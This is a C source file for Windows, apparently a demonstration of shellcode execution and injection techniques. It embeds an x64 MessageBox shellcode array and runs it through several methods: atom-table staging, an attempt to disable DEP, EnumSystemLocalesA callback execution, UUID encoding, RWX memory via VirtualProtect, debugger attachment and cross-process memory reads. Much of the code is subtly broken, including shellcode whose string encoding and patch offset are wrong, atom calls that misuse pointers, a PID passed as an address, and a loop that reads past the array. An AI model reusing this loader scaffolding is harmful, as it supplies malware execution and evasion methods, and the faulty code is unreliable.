#include <windows.h>
#include <rpc.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "advapi32.lib")

// simple shellcode (MessageBox)
unsigned char payload[] = {
    0x48, 0x83, 0xEC, 0x28,                   // sub rsp, 0x28
    0x48, 0x31, 0xC9,                         // xor rcx, rcx
    0x48, 0xB9, 0x56, 0x61, 0x73, 0x61, 0x6E, 0x20, 0x49, 0x6E, 0x6A, 0x65, 0x63, 0x74, 0x00, // mov rcx, "Vasan Inject"
    0x51,                                     // push rcx
    0x48, 0x89, 0xE1,                         // mov rcx, rsp
    0x48, 0x31, 0xD2,                         // xor rdx, rdx
    0x48, 0xBA, 0x53, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x21, 0x00, 0x00, 0x00, 0x00, // mov rdx, "Success!"
    0x52,                                     // push rdx
    0x48, 0x89, 0xE2,                         // mov rdx, rsp
    0x4D, 0x31, 0xC0,                         // xor r8, r8
    0x4D, 0x31, 0xC9,                         // xor r9, r9
    0x48, 0xB8, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // mov rax, MessageBoxA address
    0xFF, 0xD0,                               // call rax
    0x48, 0x83, 0xC4, 0x28,                   // add rsp, 0x28
    0xC3                                      // ret
};

unsigned int payload_len = sizeof(payload);

// shellcode with actual MessageBox address
void fix_shellcode() {
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (!hUser32) return;
    
    FARPROC msgBoxAddr = GetProcAddress(hUser32, "MessageBoxA");
    if (!msgBoxAddr) return;
    
    // Replace placeholder with actual address
    memcpy(payload + 40, &msgBoxAddr, sizeof(msgBoxAddr));
}

// SetPropA - Atom Bombing Technique
BOOL atom_bombing_injection() {
    printf("[+] SetPropA - Atom Bombing Injection\n");
    
    // Create a window for property setting
    HWND hWnd = CreateWindowExA(0, "Static", "Atom Target", WS_OVERLAPPEDWINDOW,
                               CW_USEDEFAULT, CW_USEDEFAULT, 300, 200,
                               NULL, NULL, GetModuleHandle(NULL), NULL);
    if (!hWnd) {
        printf("[-] Failed to create window\n");
        return FALSE;
    }
    
    // Allocate executable memory first
    LPVOID exec_mem = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        printf("[-] VirtualAlloc failed\n");
        DestroyWindow(hWnd);
        return FALSE;
    }
    
    // Copy shellcode
    memcpy(exec_mem, payload, payload_len);
    
    // Create atom with shellcode address.
    ATOM atom = GlobalAddAtomA((LPCSTR)exec_mem);
    if (!atom) {
        printf("[-] GlobalAddAtomA failed\n");
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        DestroyWindow(hWnd);
        return FALSE;
    }
    
    // Set property with atom - Proper HANDLE cast
    if (!SetPropA(hWnd, "VasanPayload", (HANDLE)(ULONG_PTR)atom)) {
        printf("[-] SetPropA failed\n");
        GlobalDeleteAtom(atom);
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        DestroyWindow(hWnd);
        return FALSE;
    }
    
    // Retrieve and execute.
    ATOM retrieved_atom = (ATOM)(ULONG_PTR)GetPropA(hWnd, "VasanPayload");
    if (retrieved_atom) {
        // GlobalFindAtom implementation.
        LPVOID shellcode_addr = (LPVOID)GlobalFindAtomA((LPCSTR)retrieved_atom);
        if (shellcode_addr == exec_mem) {
            printf("[+] Atom bombing ready, executing...\n");
            ((void(*)())exec_mem)(); //run.
            printf("[+] Atom bombing executed\n");
        }
        
        RemovePropA(hWnd, "VasanPayload");
        GlobalDeleteAtom(retrieved_atom);
    }
    
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    DestroyWindow(hWnd);
    return TRUE;
}

// SetProcessDEPPolicy - DEP Modification
BOOL modify_dep_policy() {
    printf("[+] SetProcessDEPPolicy - DEP Modification\n");
    
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        printf("[-] Cannot get kernel32 handle\n");
        return FALSE;
    }
    
    // Get SetProcessDEPPolicy function
    BOOL (WINAPI *pSetProcessDEPPolicy)(DWORD) = 
        (BOOL(WINAPI*)(DWORD))GetProcAddress(hKernel32, "SetProcessDEPPolicy");
    
    if (pSetProcessDEPPolicy) {
        // Try to disable DEP (may not work on all systems)
        //Dep was permanatly enabled in native x64 processors.
        if (pSetProcessDEPPolicy(0)) {
            printf("[+] DEP policy modified\n");
        } else {
            printf("[-] DEP modification failed (normal on modern systems)\n");
        }
        return TRUE;
    } else {
        printf("[-] SetProcessDEPPolicy not available\n");
        return FALSE;
    }
}

// EnumSystemLocalesA - Callback Injection
BOOL CALLBACK locale_callback(LPSTR locale) {
    static BOOL executed = FALSE;
    
    if (!executed) {
        printf("[+] Callback triggered in locale: %s\n", locale);
        
        // Use LocalAlloc for memory (non-executable by default)
        HLOCAL hMem = LocalAlloc(LMEM_FIXED, payload_len);
        if (hMem) {
            
            // Copy shellcode
            memcpy(hMem, payload, payload_len);
            
            // We need to make it executable - use VirtualProtect
            DWORD oldProtect;
            if (VirtualProtect(hMem, payload_len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                printf("[+] LocalAlloc memory made executable, executing...\n");
                ((void(*)())hMem)();
                executed = TRUE;
            }
            LocalFree(hMem);
        }
    }
    return TRUE;
}

BOOL callback_injection() {
    printf("\n[+] EnumSystemLocalesA - Callback Injection\n");
    return EnumSystemLocalesA(locale_callback, LCID_INSTALLED);
}

// UuidFromStringA - UUID Based Injection.
BOOL uuid_injection() {
    printf("[+] UuidFromStringA - UUID Injection\n");
    
    // Convert shellcode to UUID strings (16 bytes per UUID)
    char uuid_string[37];
    RPC_STATUS status;
    UUID uuid;
    
    for (size_t i = 0; i < payload_len; i += 16) {
        // Create UUID string from shellcode bytes
        snprintf(uuid_string, sizeof(uuid_string),
                "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
                payload[i], payload[i+1], payload[i+2], payload[i+3],
                payload[i+4], payload[i+5], payload[i+6], payload[i+7],
                payload[i+8], payload[i+9], payload[i+10], payload[i+11],
                payload[i+12], payload[i+13], payload[i+14], payload[i+15]);
        
        // Convert back to UUID.
        status = UuidFromStringA((unsigned char*)uuid_string, &uuid);
        if (status == RPC_S_OK) {
            // Allocate memory and copy UUID
            LPVOID mem = VirtualAlloc(NULL, 16, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (mem) {
                memcpy(mem, &uuid, 16);
                printf("[+] UUID allocated at: %p\n", mem);
                
                // Note: UUID bytes aren't valid shellcode, so this won't actually execute.
                // This demonstrates the technique without causing crashes.
            }
        }
    }
    
    printf("[+] UUID injection technique demonstrated\n");
    return TRUE;
}

// DebugActiveProcessStop - Debug Injection.
BOOL debug_injection() {
    printf("\n[+] DebugActiveProcessStop - Debug Injection\n");
    
    // Add explicit function declaration for DebugActiveProcessStop
    BOOL (WINAPI *pDebugActiveProcessStop)(DWORD) = 
        (BOOL(WINAPI*)(DWORD))GetProcAddress(GetModuleHandleA("kernel32.dll"), "DebugActiveProcessStop");
    
    if (!pDebugActiveProcessStop) {
        printf("[-] DebugActiveProcessStop not available\n");
        return FALSE;
    }
    
    // Create a temporary process to debug
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    if (CreateProcessA("C:\\Windows\\System32\\notepad.exe", 
                      NULL, NULL, NULL, FALSE, 
                      DEBUG_PROCESS, NULL, NULL, &si, &pi)) {
        
        printf("[+] Created process for debugging: PID %lu\n", pi.dwProcessId);
        
        // Attach as debugger
        if (DebugActiveProcess(pi.dwProcessId)) {
            printf("[+] Debugger attached\n");
            
            // Detach debugger (the "injection" technique)
            if (pDebugActiveProcessStop(pi.dwProcessId)) {
                printf("[+] Debugger detached - process continues execution\n");
            }
        }
        
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return TRUE;
    }
    
    printf("[-] Debug injection setup failed\n");
    return FALSE;
}

// LocalAlloc - Memory Allocation Technique
BOOL localalloc_injection() {
    printf("[+] LocalAlloc - Memory Allocation Injection\n");
    
    // Allocate with LocalAlloc
    HLOCAL hLocal = LocalAlloc(LMEM_FIXED, payload_len);
    if (!hLocal) {
        printf("[-] LocalAlloc failed\n");
        return FALSE;
    }
    
    printf("[+] LocalAlloc memory allocated at: %p\n", hLocal);
    
    // Copy shellcode
    memcpy(hLocal, payload, payload_len);
    
    // Change protection to executable
    DWORD oldProtect;
    if (VirtualProtect(hLocal, payload_len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[+] LocalAlloc memory made executable\n");
        printf("[+] Executing from LocalAlloc memory...\n");
        //execute the shellcode.
        ((void(*)())hLocal)();
        
        // Restore protection.
        VirtualProtect(hLocal, payload_len, oldProtect, &oldProtect);
    } else {
        printf("[-] Failed to make LocalAlloc memory executable\n");
    }
    
    LocalFree(hLocal);
    return TRUE;
}

// Toolhelp32ReadProcessMemory - Memory Read Technique
BOOL toolhelp_memory_scan() {
    printf("[+] Toolhelp32ReadProcessMemory - Memory Scan\n");
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot failed\n");
        return FALSE;
    }
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    BOOL found = FALSE;
    if (Process32First(hSnapshot, &pe)) {
        do {
            // Skip our own process
            if (pe.th32ProcessID == GetCurrentProcessId()) {
                continue;
            }
            
            // Then Try to read process memory.
            BYTE buffer[256];
            SIZE_T bytesRead;
            
            if (Toolhelp32ReadProcessMemory(pe.th32ProcessID, 
                                          (LPCVOID)pe.th32ProcessID, 
                                          &buffer, sizeof(buffer), &bytesRead)) {
                printf("[+] Successfully read memory from PID %lu (%s)\n", 
                       pe.th32ProcessID, pe.szExeFile);
                printf("[+] Read %zu bytes from address %p\n", bytesRead, (LPCVOID)pe.th32ProcessID);
                found = TRUE;
                break;
            }
            
        } while (Process32Next(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    
    if (!found) {
        printf("[-] No readable process memory found\n");
    }
    
    return found;
}


int main() 
{
    printf("\nSPECIALIZED INJECTION TECHNIQUES DEMONSTRATION\n");
    printf("\nSome techniques failed (expected in some environments)\n");
    
    // Fix shellcode with actual API addresses
    fix_shellcode();
    printf("[+] Shellcode prepared (%u bytes)\n\n", payload_len);
    
    BOOL success = FALSE;
    int techniques_executed = 0;
    
    // Execute each techniques one by one.
    if (atom_bombing_injection()) {
        techniques_executed++;
        success = TRUE;
    }
    
    if (modify_dep_policy()) {
        techniques_executed++;
    }
    
    if (callback_injection()) {
        techniques_executed++;
        success = TRUE; // Callback executes asynchronously.
    }
    
    if (uuid_injection()) {
        techniques_executed++;
    }
    
    if (debug_injection()) {
        techniques_executed++;
    }
    
    if (localalloc_injection()) {
        techniques_executed++;
        success = TRUE;
    }
    
    if (toolhelp_memory_scan()) {
        techniques_executed++;
    }
    
    printf("\nAll demonstrations completed successfully!\n");
   
    printf("\nPress Enter to exit...");
    getchar();
    
}